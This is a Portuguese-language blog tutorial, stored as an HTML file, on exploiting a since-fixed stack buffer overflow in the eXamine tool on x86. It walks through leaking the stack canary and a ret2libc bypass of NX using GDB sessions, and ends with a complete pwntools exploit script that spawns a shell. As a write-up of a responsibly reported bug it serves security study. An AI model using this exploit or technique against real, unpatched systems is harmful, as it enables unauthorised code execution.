@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+</head>
+
+<body><h1>Bypassando NX e Canary em x86</h1>
+<p>1523577600</p>
+<p>Ou “pwning for dummies”</p>
+<p>Mês passado o <a href="https://medium.com/u/ab160d5eb7a4">Fernando Mercês</a> pediu pelo <a href="https://twitter.com/MercesFernando/status/979170684881555457">Twitter</a> que reportássemos bugs em uma ferramenta dele. Como estava estudando <em>pwning,</em> imaginei que procurar por vulnerabilidades nos repositórios dele seria um bom desafio. <em>(</em> ̶<em>s̶o̶r̶r̶y̶ ̶m̶e̶r̶c̶ê̶s̶ )</em></p>
+<p>Encontrei um <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">Stack Buffer Overflow</a> na tool <a href="https://github.com/merces/examine"><strong>eXamine</strong></a> e escrevi um <em>exploit</em> <em>bypassando</em> várias proteções “modernas” como o NX e o Canary.<br />
+Esse texto é um <em>write up</em> bem introdutório sobre essas proteções e como foi o processo de escrever o <em>exploit</em> com o <a href="https://github.com/Gallopsled/pwntools"><em>pwntools</em></a>  para a arquitetura x86, depois soltarei outro texto para x64, também assumo que o leitor já tenha algum conhecimento sobre <em>buffer overflows</em>, <em>Assembly</em> e etc.</p>
+<p>A vulnerabilidade foi consertada em tempo recorde de 2 dias.<br />
+<em>Se você for</em> um <strong><em>l33t0</em></strong> <em>apressado, o exploit tá lá embaixo.</em></p>
+<h3>Stack Buffer Overflow</h3>
+<p>Reprodução da função main do código vulnerável</p>
+<pre><code>            int main(int argc, char *argv[]) {
+                int i;
+                char s[MAX_CMD_LINE], c;
+
+                memset(s, 0, MAX_CMD_LINE);
+
+                // Loop until Ctrl+C is pressed
+                for (i=0; ; i++) {
+                    if ((c = getchar()) == EOF) // End Of File reached when reading from a pipe
+                        break;
+
+                    if (c == '\n') {
+                        examine(s);
+                        memset(s, 0, MAX_CMD_LINE);
+                        i=-1;
+                        putchar('\n');
+                    }
+                    s[i] = c;
+                }
+
+                return 0;
+            }
+</code></pre>
+<p>Note a linha 18, ela escreve um <em>char</em> na array “<em>s”</em> mas nunca checa se o “<em>i”</em> é maior do que o tamanho da <em>array</em>. Assim, podemos escrever o quanto quisermos na <em>stack.</em> Agora fica fácil de redirecionar a execução do programa para onde quisermos, é só colocar um <em>shellcode</em> na <em>stack</em> e executa-lo, certo ?</p>
+<p>Errado ( ̶o̶t̶á̶r̶i̶o̶!̶), o problema é que essa vulnerabilidade já tem mais de <a href="https://en.wikipedia.org/wiki/Buffer_overflow#History">40 anos</a>, e com o tempo os sistemas operacionais foram implementando várias proteções que dificultam enormemente a exploração.</p>
+<p>Utilizando o <a href="https://github.com/RobinDavid/checksec/blob/master/checksec.sh"><em>checksec</em></a> conseguimos verificar todas as proteções no nosso binário: <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">Canary</a>; <a href="https://tk-blog.blogspot.com.br/2009/02/relro-not-so-well-known-memory.html">RELRO</a> e <a href="https://en.wikipedia.org/wiki/NX_bit">NX</a> — Eu desabilitei o <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> da minha máquina, porque ̶s̶o̶u̶ ̶n̶0̶0̶b̶ ativado faria com que as alocações de memória fossem aleatórias, tentarei fazer um <em>exploit</em> para <em>bypassar</em> ele também no futuro.</p>
+<pre><code>            $ checksec examine32  
+            \[\*\] ‘/home/vagrant/host/CTF/mentebinaria/examine/examine32’  
+             Arch: i386–32-little  
+             RELRO: Partial RELRO  
+             Stack: Canary found  
+             NX: NX enabled  
+             PIE: No PIE (0x8048000)  
+             FORTIFY: Enabled
+</code></pre>
+<h3>No-eXecute</h3>
+<p>Também conhecido como NX, essa proteção determina quais áreas da memória poderão ser executadas. Impedindo assim, que o atacante coloque seu <em>payload</em> malicioso na <em>Stack</em> e o execute com alguma vulnerabilidade. Existem inúmeras maneiras de evitar essa proteção, neste <em>exploit</em> eu usei o _ret2libc — _recomendo a leitura do primeiro <a href="http://seclists.org/bugtraq/1997/Aug/63">artigo sobre o assunto</a>.</p>
+<p>A idéia principal do <em>ret2libc</em> é que ao invés de redirecionarmos a execução do programa para o nosso payload na <em>stack,</em> vamos executar algo da <a href="https://en.wikipedia.org/wiki/C_standard_library">libc</a> como um <em>system(“/bin/sh”)</em> por exemplo. Para fazermos isso precisamos passar argumentos para a função. No x86 os argumentos ficam na <em>stack</em>, então temos que prepará-la de acordo com o que quisermos fazer. No caso nossa stack terá que se parecer com essa :</p>
+<p><img alt="" src="img/1__LjEI__MYRVHuZ8UHdYKsVFQ.png" /></p>
+<p>Então temos que descobrir os endereços. Para fazer isso podemos utilizar o <a href="https://en.wikipedia.org/wiki/GNU_Debugger">GDB</a> com o <a href="https://github.com/longld/peda"><strong>peda</strong></a>. Descobrindo os endereços de <em>exit</em> e de <em>system</em> na <em>libc</em>:</p>
+<pre><code>            gdb-peda$ p system  
+            $1 = {&lt;text variable, no debug info&gt;} 0xf7e19e70 &lt;system&gt;  
+            gdb-peda$ p exit  
+            $2 = {&lt;text variable, no debug info&gt;} 0xf7e0cf50 &lt;exit&gt;
+</code></pre>
+<p>Também precisamos encontrar o endereço da string “/bin/sh” :</p>
+<pre><code>            gdb-peda$ find “/bin/sh”  
+            Searching for ‘/bin/sh’ in: None ranges  
+            Found 1 results, display max 1 items:  
+            libc : 0xf7f39fcc (“/bin/sh”)
+</code></pre>
+<p>Importante notar que é necessário saber qual a versão do <em>libc</em> na máquina alvo para encontrar as funções desejadas (<em>system</em> por exemplo), calculando os <em>offsets</em> através do endereço base de memória alocada para <em>libc</em>. Pois os <em>offsets</em> se diferenciam entre as versões. Aqui tem uma database de versões para ajudar a encontrar : <a href="https://github.com/niklasb/libc-database">github.com/niklasb/libc-database</a> — Discutirei isso mais a fundo no próximo post.</p>
+<p>Vamos começar o esboço do nosso <em>exploit</em>.  </p>
+<p>from pwn import *</p>
+<pre><code>            p = process("./examine32")
+            system = 0xf7e19e70
+            exit = 0xf7e0cf50
+            bash = 0xf7f39fcc
+            offset = ???
+
+            exploit = "A"*offset+p32(system)+p32(exit)+p32(bash)+"\xff"
+
+            p.sendline(exploit)
+            p.interactive()
+</code></pre>
+<p>Abrimos o processo, declaramos os endereços, montamos o <em>payload</em> e adicionamos o <em>0xff</em> para servir de EOF — Vide linha 9 do código, precisamos do EOF para atingirmos o <em>return.</em></p>
+<p>Mas ainda não sabemos o <em>offset,</em> vamos descobri-lo usando o GDB :<br />
+<em>Leia os # , são meus comentários.</em></p>
+<pre><code>            $ gdb ./examine32  
+            \[... cortado\]  
+            gdb-peda$ pattern\_create 2000 pat   
+            Writing pattern of 2000 chars to filename “pat”  
+            \# Primeiro criamos um arquivo "pat" de tamanho 2000 com um pattern para podermos identificar exatamente o offset  
+            gdb-peda$ r &lt; pat # rodando o programa com o arquivo pat  
+            Starting program: /home/vagrant/host/CTF/mentebinaria/examine/examine32 &lt; pat
+
+            Program received signal SIGSEGV, Segmentation fault.  
+            \# Recebemos um SIGSEGV, vamos analizar por que.  
+            \[... cortado\]  
+            \[ — — — — — — — — — — — — — — — — — — -code — — — — — — — — — — — -\]  
+             0xf7e0c5cb &lt;getenv+107&gt;: mov esi,DWORD PTR \[ebp+0x0\]  
+             0xf7e0c5ce &lt;getenv+110&gt;: test esi,esi  
+             0xf7e0c5d0 &lt;getenv+112&gt;: je 0xf7e0c62a &lt;getenv+202&gt;  
+            \=&gt; 0xf7e0c5d2 &lt;getenv+114&gt;: cmp di,WORD PTR \[esi\]  # por algum motivo o binário foi parar em getenv e bugou pois o valor de ESI foi sobrescrito  
+            \[... cortado\]
+
+            gdb-peda$ bt # vamos checar com o backtrace porque o binário foi parar em getenv  
+            #0 0xf7e0c5d2 in getenv () from /lib32/libc.so.6  
+            #1 0xf7e4230b in ?? () from /lib32/libc.so.6  
+            #2 0xf7ed5c9b in \_\_fortify\_fail () from /lib32/libc.so.6  
+            #3 0xf7ed5c2a in \_\_stack\_chk\_fail () from /lib32/libc.so.6 # Opa ,o que é isso ?   
+            #4 0x08048767 in main ()
+</code></pre>
+<p>Recebemos um SIGSEGV pois o binário chamou <em>__stack_chk_fail</em>, vamos fazer uma breve análise no <a href="https://www.hex-rays.com/products/ida/">IDA</a> para entendermos porque ele foi parar lá.</p>
+<p><img alt="" src="img/1__MjbYO0SYl6xdmCi1XvaY1w.jpeg" /></p>
+<p>Na <strong>seta</strong> <strong>1</strong> ele compara o nosso <em>input</em> com <em>0xff </em>, isso corresponde a linha 9 do <em>main</em>, onde ele compara com EOF e que resulta no <em>return</em>. Mas antes de ir para o <em>return</em> ele vai para <strong>seta 2</strong> onde ele compara um valor da <em>stack</em> <em>“$esp+3FCh”</em> com outro um valor <em>“$gs:14h”</em> e checa se são iguais, caso não forem ele chama a função <em>__stack_chk_fail,</em> que causou o erro.</p>
+<h3>Canary</h3>
+<p>Isto é chamado de Canary, ou <em>stack cookie</em>, um valor randômico que o programa conhece que é colocado na <em>stack</em> e antes de fazer um <em>return</em> é checado se ele foi alterado. Nosso problema é que para fazermos o <em>ret2libc,</em> ou qualquer outra técnica de <em>buffer overflow,</em> vamos acabar sobrescrevendo o Canary. Então para <em>bypassa-lo</em> precisamos conhecer o seu valor.</p>
+<p>Mas antes de tentarmos descobrir o valor, precisamos ainda descobrir o <em>offset</em> correto. Para isso, voltemos ao GDB. Vamos basicamente ignorar a checagem do <em>Canary</em> e ver o que acontece.<br />
+<em>Leia os # , são meus comentários.</em></p>
+<pre><code>            $ gdb ./examine32  
+            gdb-peda$ disas main  
+            \# Vamos encontrar onde ele faz a checagem que vimos no IDA  
+            Dump of assembler code for function main:  
+             \[... cortado\]  
+             0x08048748 &lt;+152&gt;: xor eax,eax # É aqui onde começa o a checagem do Canary  
+             0x0804874a &lt;+154&gt;: mov esi,DWORD PTR \[esp+0x3fc\]  
+             0x08048751 &lt;+161&gt;: xor esi,DWORD PTR gs:0x14  
+             0x08048758 &lt;+168&gt;: jne 0x8048762 &lt;main+178&gt;  
+             0x0804875a &lt;+170&gt;: lea esp,\[ebp-0xc\]  
+             0x0804875d &lt;+173&gt;: pop ebx  
+             0x0804875e &lt;+174&gt;: pop esi  
+             0x0804875f &lt;+175&gt;: pop edi  
+             0x08048760 &lt;+176&gt;: pop ebp  
+             0x08048761 &lt;+177&gt;: ret  
+             0x08048762 &lt;+178&gt;: call 0x80485e0 &lt;\_\_stack\_chk\_fail@plt&gt;  
+            End of assembler dump.  
+            gdb-peda$ b \* main+161 # colocando um breakpoint para logo antes do jne  
+            Breakpoint 1 at 0x8048751  
+            gdb-peda$ r &lt; pat # executando o programa
+
+            \[... cortado\]  
+            \[ — — — — — — — — — — — — — -code — — — — — — — — — — — — — — — — -\]  
+             0x8048741 &lt;main+145&gt;: lea esi,\[esi+eiz\*1+0x0\]  
+             0x8048748 &lt;main+152&gt;: xor eax,eax  
+             0x804874a &lt;main+154&gt;: mov esi,DWORD PTR \[esp+0x3fc\]  
+            \=&gt; 0x8048751 &lt;main+161&gt;: xor esi,DWORD PTR gs:0x14  
+             0x8048758 &lt;main+168&gt;: jne 0x8048762 &lt;main+178&gt;  
+             0x804875a &lt;main+170&gt;: lea esp,\[ebp-0xc\]  
+             0x804875d &lt;main+173&gt;: pop ebx  
+             0x804875e &lt;main+174&gt;: pop esi  
+            \[ — — — — — — — — — — —— — — stack — — — — — — — — — — — — — — — -\]  
+            \[... cortado\]  
+            Breakpoint 1, 0x08048751 in main () # atingimos o breakpoint  
+            gdb-peda$ s # indo para o jne  
+            \[... cortado\]  
+            \[ — — — — — — — — — — — — — — — — -code — — — — —— — — — — — — — -\]  
+             0x8048748 &lt;main+152&gt;: xor eax,eax  
+             0x804874a &lt;main+154&gt;: mov esi,DWORD PTR \[esp+0x3fc\]  
+             0x8048751 &lt;main+161&gt;: xor esi,DWORD PTR gs:0x14  
+            \=&gt; 0x8048758 &lt;main+168&gt;: jne 0x8048762 &lt;main+178&gt;  
+             | 0x804875a &lt;main+170&gt;: lea esp,\[ebp-0xc\]  
+             | 0x804875d &lt;main+173&gt;: pop ebx  
+             | 0x804875e &lt;main+174&gt;: pop esi  
+             | 0x804875f &lt;main+175&gt;: pop edi  
+             |-&gt; 0x8048762 &lt;main+178&gt;: call 0x80485e0 &lt;\_\_stack\_chk\_fail@plt&gt;  
+             0x8048767 &lt;\_start&gt;: xor ebp,ebp  
+             0x8048769 &lt;\_start+2&gt;: pop esi  
+             0x804876a &lt;\_start+3&gt;: mov ecx,esp  
+             JUMP is taken  
+            \[... cortado\]  
+            0x08048758 in main ()  
+            gdb-peda$ j \* main+170 # dando um jump para 0x804875a, ignorando o jne  
+            Continuing at 0x804875a.
+
+            Program received signal SIGSEGV, Segmentation fault.  
+            \[ — — — — — — — —— — — — — registers — — — — — — — — — — — — — — -\]  
+            EAX: 0x0  
+            EBX: 0x6e41246e (‘n$An’)  
+            ECX: 0xf7f858a4 → 0x0  
+            EDX: 0xffffffff  
+            ESI: 0x436e416e (‘nAnC’)  
+            EDI: 0x412d6e41 (‘An-A’)  
+            EBP: 0x6e41286e (‘n(An’)  
+            ESP: 0xffffd650 (“An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC”…)  
+            EIP: 0x3b6e4144 (‘DAn;’) # EIP sobrescrito  
+            EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)  
+            \[ — — — — — — — — — — — — — -code — — — — — — — — — — — — — — — -\]  
+            Invalid $PC address: 0x3b6e4144  
+            \[... cortado\]  
+            Stopped reason: SIGSEGV  
+            0x3b6e4144 in ?? ()  
+            gdb-peda$ pattern\_offset “DAn;” # procurando o offset de “DAn;”   
+            DAn; found at offset: 1032 # achamos o offset
+</code></pre>
+<h4>Lendo o Canary</h4>
+<p>Precisamos de alguma forma ler o conteúdo do Canary para coloca-lo certo na stack. <br />
+Depois de receber um <em>input</em> o programa executa o código abaixo, que transforma a array para URL Encoding.</p>
+<pre><code>            for (i=0; i &lt; strlen(s); i++)  
+                 printf("%%%2X", s\[i\]);
+</code></pre>
+<p><img alt="" src="img/1__ApAL8LqAtt__k__oIK8DiK__A.png" /></p>
+<p>Essa é a <em>stack</em> normal do programa, com o Canary logo depois da <em>array</em> que estamos sobrescrevendo. Note os bytes nulos no final dos dois.</p>
+<p>Uma <em>string</em>, sendo uma <em>array</em> de <em>chars</em>, tem seu término delimitado pelo byte nulo. Se sobrescrevermos apenas o <em>nullbyte</em> da string “<em>s”</em> o <em>strlen</em> continuará contando até encontrar o outro <em>nullbyte</em> do Canary, assim, conseguiremos <em>printar</em> o valor do Canary.<br />
+Segue :</p>
+<pre><code>            $ python -c “print ‘A’\*1001” &gt; aaa # 1001 é o tamanho da array  
+            $ ./examine32 &lt; aaa  
+            \[... cortado\]  
+            URL encoding: %41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%FFFFFF9C%FFFFFFCF%FFFFFFD3%FFFFFFC4%43%FFFFFFF8%FFFFFFF7
+</code></pre>
+<p>Conseguimos assim ler os valores do Canary, depois temos apenas que montar a stack com o valor dele para não cairmos no <em>__stack_chk_fail.</em></p>
+<p>E o exploit final :</p>
+<pre><code>            from pwn import *
+
+            p = process("./examine32")
+            offset = 1032 # offset para sobrescrever o EIP
+            read_canary_payload = "A"*1001 # sobrescrevendo o nullbyte para leakar o valor do Canary
+            p.sendline(read_canary_payload)
+            canary = p.recvuntil("Timestamp").split("%") 
+            canary = [canary[i][-2:] for i in range(-7,0)][:3] # Lendo o output
+            canary = [x.replace(" ","0") for x in canary] # o zero buga o printf
+            print "[!] Canary found : "+str(canary)
+            canary = int(''.join(canary),16)
+
+            system = 0xf7e19e70
+            exit = 0xf7e0cf50
+            bash = 0xf7f39fcc
+
+            exploit = "A"*1000+p32(canary)[::-1]+"\x00" # o canary acaba com nullbyte
+            exploit += ("A"*(offset-len(exploit)))+p32(system)+p32(exit)+p32(bash)+"\xff" # 0xff = EOF
+            p.sendline(exploit)
+            p.interactive() # g0t sh3ll ?
+</code></pre>
+<p>Como em x64 os argumentos ficam nos registradores, precisaremos fazer mais coisa antes de chamar o <em>system,</em> esse será o tópico do próximo post.</p>
+<p>Inté !</p></body></html>
